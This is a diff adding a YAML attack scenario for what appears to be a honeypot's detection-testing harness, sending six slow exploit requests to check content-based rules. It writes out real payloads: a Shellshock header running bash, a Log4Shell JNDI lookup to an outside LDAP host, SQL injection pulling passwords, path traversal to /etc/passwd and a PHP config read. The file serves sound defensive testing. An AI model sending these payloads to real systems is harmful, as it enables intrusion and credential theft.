@@ -1,0 +1,31 @@
+# Slow-and-low web exploitation.
+#
+# The opposite of web_path_scan: a handful of high-value exploit payloads sent
+# slowly, the way an operator who knows exactly what they are looking for and
+# does not want to trip a rate threshold behaves. Deliberately stays *under* the
+# volume rules so it demonstrates that the payload-signature rules (log4shell,
+# shellshock, sql_injection, path_traversal, webshell_upload) fire on content,
+# not just on count.
+#
+# Every payload is inert against this honeypot: the HTTP service classifies and
+# records them and never executes anything. See honeypot/deception/responses.py.
+
+name: slow_and_low
+service: http
+description: Low-volume, high-signal exploit payloads (content-based detection)
+rate_per_second: 0.5      # one every two seconds — under every volume threshold
+count: 6
+method: POST
+user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+headers:
+  # Shellshock lives in a header, not the path — checks header inspection.
+  X-Api-Version: "() { :; }; /bin/bash -c 'id'"
+
+payloads:
+  - "/?x=${jndi:ldap://198.18.0.44:1389/Basic/Command/Base64/aWQ=}"
+  - "/search?q=1' UNION SELECT username,password FROM users--"
+  - "/download?file=../../../../../../etc/passwd"
+  - "/cgi-bin/status"
+  - "/uploads/webshell.php"
+  - "/index.php?page=php://filter/convert.base64-encode/resource=config"
